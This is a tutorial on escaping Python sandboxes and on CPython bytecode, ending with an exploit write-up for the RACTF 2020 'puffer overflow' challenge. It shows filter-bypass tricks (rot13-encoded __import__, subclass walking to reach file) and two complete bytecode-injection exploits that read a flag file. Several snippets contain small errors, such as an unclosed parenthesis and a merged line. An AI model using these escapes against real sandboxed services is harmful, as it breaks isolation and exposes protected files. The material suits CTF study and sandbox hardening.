# Introduction to the python sandbox and bytecode


Do one thing at a time, and do well.

<!--more-->

# Introduction to the python sandbox

## What's the python sandbox?

The python sandbox is a restricted environment that you may not be able to use some packages, even you can't use import instruction. You have to think about  a way to achieve your goals(get shell or get flag) in the restricted environment. This article is about how to bypass the python sandbox. Let's begin our travel.

First, let's look at the simplest environment that you can use anything. It means no instructions are forbidden.

## No instructions forbidden

In this environment, we can use some packets to get shell. For example, the os packet provide us a system function, we can use it to get shell or anything you want. it also have a popen function, that have a same effect. Except that, the command and subprocess pecket is also useful for us. These packet will help us to get shell in some function. Let's look the code to make thought more clear.

```` python
import os 
os.system('ls')
os.popen('ls')

import commands
commands.getoutput('ls')
commands.getstatusoutput('ls')

import subprocess
subprocess.call(['ls'],shell=true)
````

Obviously, the defender won't make so simple environment, they must ban some functions, filter some code to prevent you to get shell.

## filter os, commands , subprocess, sys 

To filter these strings is easy, below code can do that.

````python
import re
code = open('code.py').read()
pattern = re.compile('import\s+(os|commands|subprocess|sys)')
match = re.search(pattern,code)
if match:
    print 'forbidden module import detected'
````

Above code, we can't use os,commands,subprocess,sys,import any more.so what tech can we use to bypass this sandbox? \_\_import\_\_ and imoprtlib may is useful. We kown imoprt is a key word, so the packet name must be tag. But for function, it need parameter. And the \_\_imoprt\_\_ is the function version of import, so the packet name will be parameter not tag. Then we can encode the parameter to bypass string filter. The theory of importlib is same.

```` python
f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')

import importlib
f3ck = importlib.import_module("pbzznaqf".decode('rot_13')
print f3ck.getoutput('ifconfig')
````

Except these, builtin function is also useful. The builtin function is live in python environment and need't import. \_\_builtin\_\_ is the object having some builtin functions, we can use it to achieve some goals.

For example, if we want to use open, init, chr, we juset need to use \_\_builtin\_\_.open(), \_\_builtin\_\_.init(), \_\_builtin\_\_.chr()

```` python
__builtins__.open()
__builtins__.init()
__builtins__.chr()
````

\_\_builtin\_\_ have some another dangerous functions(_\_import\_\_,eval,exec,execfile)，so the defender may delete these. When it be deleted from \_\_builtin\_\_, we can't use it.

````python
>>> del __builtins__.chr
>>> del __builtins.chr
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name '__builtins' is not defined
````

Although delete this function feel is safe, we can use reload(__buiiltins\_\_), then those are deleted function before can use again. The reload function is from imp packet.

````python
import imp
imp.reload(__builtins__)
````

## use object/module's attribution

First, introduce a function dir. it will show attribution that the object/module can use. For example, if we want to know the list have how many functions, we can use dir([]) .

````python
>>> dir([])
['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']
````

In these function, we may pay attention to \_\_class\_\_ attribution. this attribution is the class of object. for example, the list object's class is list class, and the class have a \_\_base\_\_ attribution. it's a tuple about this class's parent class, also it means list it's inherit classes.

````python
>>> [].__class__.__bases__
(<type 'object'>,)
````

the object is a top class, many subclass inherit it.so it's subclass attribution will list many useful class.

````python
>>> [].__class__.__bases__[0].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>
````

Thus, we can find some useful function from this. for example, we can use file class to get flag:)

````python
>>> [].__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read()
'flag{you_are_itelli}\n'
````

# Introduction to the python bytecode

## Function Object

First，we'll start out with a really high-level view of python's internals. What happens when you execute a line of code in your python REPL?

There are four steps that python takes when you hit return: lexing, parsing, compiling, and interpreting. Lexing is breaking the line of code you just typed into tokens. The parser takes those tokens and generate a structure that shows their relationship to each other(in this case , an Abstract Syntax Tree). The compiling then takes the AST and turns it into one code objects(stack oriented programming language).Finally, the interpreter takes each code object executes the code it represents.

You might head of 'function objects'. it also be called 'functions are first-class objects', or 'python has first-class functions.'. Let's take a look at one.

```python
>>> def func(a):
...     b=b+2
... 	return a+b
...
>>> func
<function func at 0x7f6175335950>
```

We can look that func is a func object.so it function is a object, it also have some attribution, we can use dir function to list attributions of the function object.

````python
>>> dir(func)
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
````

We need't care about all attribution,just pay attention to \_\_code\_\_, let's look what is it.

````python
>>> func.__code__
<code object func at 0x7f6175335230, file "<stdin>", line 1>
````

func.\_\_code\_\_ is a code object, what is code object? let's look at next subject.

## Code Object

A code object is generated by the python compiler and interpreted by the interpreter. It contains information that interpreter needs to do its job. Let's look at the attributes of the code object.

````python
>>> dir(func.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
````

There's a bunch of stuff going on here, much of which we're not going to worry about today Let's take a look at three attributes that are interesting to us for our code object.

````python
>>> func.__code__.co_varnames
('a', 'b')
>>> func.__code__.co_consts
(None, 2)
>>> func.__code__.co_argcount
1
````

the co_varnames is the name of local variable  used in functions. the co_consts is some consts we can see in code. the argcount is count of arguments. But so fat, we haven't seen anything that looks like instructions to execute the code. these instructions are called bytecode. we can use co_code to look at it.

````python
>>> func.__code__.co_code
'|\x01\x00d\x01\x00\x17}\x01\x00|\x00\x00|\x01\x00\x17S'
````

## Byte Code

we can seen that byte code is a series of bytes. they look wacky when we print them because some bytes are printable and other aren't. we can transfer it to number.

```` python
>>> [ord(i) for i in func.__code__.co_code ]
[124, 1, 0, 100, 1, 0, 23, 125, 1, 0, 124, 0, 0, 124, 1, 0, 23, 83
````

Ok, we can see that these bytes that make up python bytecode. but what's it mean? we can use dissemble function to know it.

````python
>>> import dis
>>> dis.dis(func.__code__.co_code)
          0 LOAD_FAST           1 (1)
          3 LOAD_CONST          1 (1)
          6 BINARY_ADD     
          7 STORE_FAST          1 (1)
         10 LOAD_FAST           0 (0)
         13 LOAD_FAST           1 (1)
         16 BINARY_ADD     
         17 RETURN_VALUE 
````

dis.dis take these bytecode to human-readable. now, we can know what these byte means.

The first columns is the offset into the bytecode. The second columns just for our human, make us can read it. the interpreter doesn't need it.

The last two columns give some details information about the argument of instructions. The three columns represents an index into other attributes of the code object. for example, LOAD_FAST's argument is an index into the list co_varnames. 

But how the dis module get from bytes like 100 to names like LOAD_CONST and back? The file opcode.py defines the instructions and it's value, so dis can look through the file to translate bytecode to human-readable.

ok, there may be last question? How to execute the python interpreter? 

first, i want to introduce a named stack oriented programming language. it pay all attention to stack. for example, if you want to compute a add b, these program will push a into stack, then push b to stack, eventually execute add instruction. after that, it will pop a and b, and push result into stack. the work of python interpreter is same as that. for LOAD_FAST 1 , it will push a into stack LOAD_CONST  1 will push 2 const into stack. and then BINARY_ADD will pop a and 2, push result into stack.

# 2020RACTF-puffer overflow

let's look at one ctf problem. this subject is include python sandbox and bytecode. first we'll look what's the problem.

````python
def put_on_stack(string):
    """
    Generate the bytecode required to put a single string
    onto the stack.
    """
    op = b""
    for n, i in enumerate(string):
        # LOAD_GLOBAL 0 (chr)
        op += b"t\x00"

        # LOAD_CONST n
        op += b"d" + bytes([ord(i)])

        # CALL_FUNCTION 1
        op += b"\x83\x01"

        if n != 0:
            # BINARY_ADD
            op += b"\x17\x00"
    return op

def execute_bytecode(code):
    """
    Executes the provided bytecode. Handy for getting the
    top item off the stack.
    """
    from types import CodeType
    import builtins

    # This should be large enough for most things
    stacksize = 1024

    # Load in enough for put_on_stack to work.
    # NOTE: This function is unable to call "import" or similar
    #       dangerous things due to co_names acting as a whitelist.
    #     (Python loads names from a constants array, so it can"t
    #      load something that"s not there!)
    consts = (*range(256), )
    names = ("chr", "ord", "globals", "locals", "getattr", "setattr")

    # Tag on a trailing RETURN call just incase.
    code += b"S\x00"
    # Construt the code object
    inject = CodeType(
        0,  # For python 3.8
        0, 0, 0, stacksize, 2, code, consts,
        names, (), "", "", 0, b"", (), ()
    )

    # Create a copy of globals() and load in builtins. builtins aren"t
    # normally included in global scope.
    globs = dict(globals())
    globs.update({i: getattr(builtins, i) for i in dir(builtins)})

    # Go go go!
    return eval(inject, globs)

def smart_input():
    """
    This function aims to make python 3's input smart:tm:
    It checks if you're piping or redirecting, and switches to reading
    from stdin directly.
    """
    import os, sys, stat
    mode = os.fstat(0).st_mode

    if stat.S_ISREG(mode) or stat.S_ISFIFO(mode):
        return sys.stdin.buffer.read()
    return input().encode()

print("Hello!")
print("What's your name?")
name = smart_input()
name = put_on_stack(name[:32].decode()) + name[32:]
print(f"Hello {execute_bytecode(name)}!")
print("It's nice to meet you!")
````

this scripts don't restrict us to enter how many words, and it will show the first 32 words. but  after that, we enter will execute. 

````python
def execute_bytecode(code):
    """
    Executes the provided bytecode. Handy for getting the
    top item off the stack.
    """
    from types import CodeType
    import builtins

    # This should be large enough for most things
    stacksize = 1024

    # Load in enough for put_on_stack to work.
    # NOTE: This function is unable to call "import" or similar
    #       dangerous things due to co_names acting as a whitelist.
    #     (Python loads names from a constants array, so it can"t
    #      load something that"s not there!)
    consts = (*range(256), )
    names = ("chr", "ord", "globals", "locals", "getattr", "setattr")

    # Tag on a trailing RETURN call just incase.
    code += b"S\x00"
    # Construt the code object
    inject = CodeType(
        0,  # For python 3.8
        0, 0, 0, stacksize, 2, code, consts,
        names, (), "", "", 0, b"", (), ()
    )

    # Create a copy of globals() and load in builtins. builtins aren"t
    # normally included in global scope.
    globs = dict(globals())
    globs.update({i: getattr(builtins, i) for i in dir(builtins)})

    # Go go go!
    return eval(inject, globs)
````

this code is the critical portion. the code's names is "chr", "ord", "globals", "locals", "getattr", "setattr", and consts is from 0 to 255. we need use these to execute our code. if we enter bytecode of globals()\['open'\]('./flag.txt').read(), we can get the flag. but how to enter those bytes?

we can use opcode.py help us to write bytecode. for example ,it we want to execute globals(), we need to write LOAD_NAMES of globals, and then CALL_FUNCTION with no arguments. the bytecode of these instructions, we can find in opcode.py. there also have one tricky problem. we haven't open and ./flag.txt sting. so how to create it? we can use chr function and BINARY_ADD to compute these string. eventually the read is a attribution of object, so we need use getattr to call read. Let's look at the full code.

````python
import sys
def put(string):
	bytecode=b''
	for n,i in enumerate(string):
		bytecode+=b'\x65\x00' #LOAD_NAME 0
		bytecode+=b'\x64'+bytes([ord(i)]) #LOAD_CONST
		bytecode+=b'\x83\x01' #CALL_FUNC 1
		if n!=0:
			bytecode+=b'\x17\x00' #BINARY_ADD
	return bytecode

def attr(payload,attr):
	bytecode=b'\x65\x04' #LOAD_NAME 5
	bytecode+=payload
	bytecode+=put(attr)
	bytecode+=b'\x83\x02' #CALL_FUNC 2
	return bytecode

# globals()
bytecode=b'\x65\x02' #LOAD_NAME 2
bytecode+=b'\x83\x00' #CALL_FUNC 0

# globals()['open']
bytecode+=put("open")
bytecode+=b'\x19\x10' #BINARY_SUBSCR

# globals()['open']('flag.txt')
bytecode+=put("./flag.txt")
bytecode+=b'\x83\x01' #CALL_FUNC 1

# globals()['open']('flag.txt').read()
bytecode=attr(bytecode,"read")
bytecode+=b'\x83\x00'
payload=b'\x61'*32+bytecode

sys.stdout.buffer.write(payload)
````

except the way, we also can use attribution of func_object to get bytecode without write anything. but for get the same environment of the subject. we need to enter some names and consts.

````python
import sys
import dis
def exploit():
	chr
	ord 
	globals 
	locals
	getattr 
	setattr	chr(0)+chr(1)+chr(2)+chr(3)+chr(4)+chr(5)+chr(6)+chr(7)+chr(8)+chr(9)+chr(11)+chr(11)+chr(12)+chr(13)+chr(14)+chr(15)+chr(16)+chr(17)+chr(18)+chr(19)+chr(20)+chr(21)+chr(22)+chr(23)+chr(24)+chr(25)+chr(26)+chr(27)+chr(28)+chr(29)+chr(30)+chr(31)+chr(32)+chr(33)+chr(34)+chr(35)+chr(36)+chr(37)+chr(38)+chr(39)+chr(40)+chr(41)+chr(42)+chr(43)+chr(44)+chr(45)+chr(46)+chr(47)+chr(48)+chr(49)+chr(50)+chr(51)+chr(52)+chr(53)+chr(54)+chr(55)+chr(56)+chr(57)+chr(58)+chr(59)+chr(60)+chr(61)+chr(62)+chr(63)+chr(64)+chr(65)+chr(66)+chr(67)+chr(68)+chr(69)+chr(70)+chr(71)+chr(72)+chr(73)+chr(74)+chr(75)+chr(76)+chr(77)+chr(78)+chr(79)+chr(80)+chr(81)+chr(82)+chr(83)+chr(84)+chr(85)+chr(86)+chr(87)+chr(88)+chr(89)+chr(90)+chr(91)+chr(92)+chr(93)+chr(94)+chr(95)+chr(96)+chr(97)+chr(98)+chr(99)+chr(100)+chr(101)+chr(102)+chr(103)+chr(104)+chr(105)+chr(106)+chr(107)+chr(108)+chr(109)+chr(110)+chr(111)+chr(112)+chr(113)+chr(114)+chr(115)+chr(116)+chr(117)+chr(118)+chr(119)+chr(120)+chr(121)+chr(122)+chr(123)+chr(124)+chr(125)+chr(126)+chr(127)+chr(128)+chr(129)+chr(130)+chr(131)+chr(132)+chr(133)+chr(134)+chr(135)+chr(136)+chr(137)+chr(138)+chr(139)+chr(140)+chr(141)+chr(142)+chr(143)+chr(144)+chr(145)+chr(146)+chr(147)+chr(148)+chr(149)+chr(150)+chr(151)+chr(152)+chr(153)+chr(154)+chr(155)+chr(156)+chr(157)+chr(158)+chr(159)+chr(160)+chr(161)+chr(162)+chr(163)+chr(164)+chr(165)+chr(166)+chr(167)+chr(168)+chr(169)+chr(170)+chr(171)+chr(172)+chr(173)+chr(174)+chr(175)+chr(176)+chr(177)+chr(178)+chr(179)+chr(180)+chr(181)+chr(182)+chr(183)+chr(184)+chr(185)+chr(186)+chr(187)+chr(188)+chr(189)+chr(190)+chr(191)+chr(192)+chr(193)+chr(194)+chr(195)+chr(196)+chr(197)+chr(198)+chr(199)+chr(200)+chr(201)+chr(202)+chr(203)+chr(204)+chr(205)+chr(206)+chr(207)+chr(208)+chr(209)+chr(210)+chr(211)+chr(212)+chr(213)+chr(214)+chr(215)+chr(216)+chr(217)+chr(218)+chr(219)+chr(220)+chr(221)+chr(222)+chr(223)+chr(224)+chr(225)+chr(226)+chr(227)+chr(228)+chr(229)+chr(230)+chr(231)+chr(232)+chr(233)+chr(234)+chr(235)+chr(236)+chr(237)+chr(238)+chr(239)+chr(240)+chr(241)+chr(242)+chr(243)+chr(244)+chr(245)+chr(246)+chr(247)+chr(248)+chr(249)+chr(250)+chr(251)+chr(252)+chr(253)+chr(254)+chr(255)
	return getattr(globals()[chr(111)+chr(112)+chr(101)+chr(110)](chr(102)+chr(108)+\
		chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()

sys.stdout.buffer.write(b'a'*32+exploit.__code__.co_code)
````

Attention: because \x10 will end the enter, so we replace it to \x11

# Reference

[Python沙箱逃逸的n种姿势](https://xz.aliyun.com/t/52#toc-13)

[Introduction to the Python Interpreter, Part 1: Function Objects](https://akaptur.com/blog/2013/11/15/introduction-to-the-python-interpreter/)

[1064CBread](https://ohaithe.re/post/620649441275297792/ractf-puffer-overflow)

[bout_to_get_flagged](https://ypl.coffee/ractf-2020-puffer-overflow/)


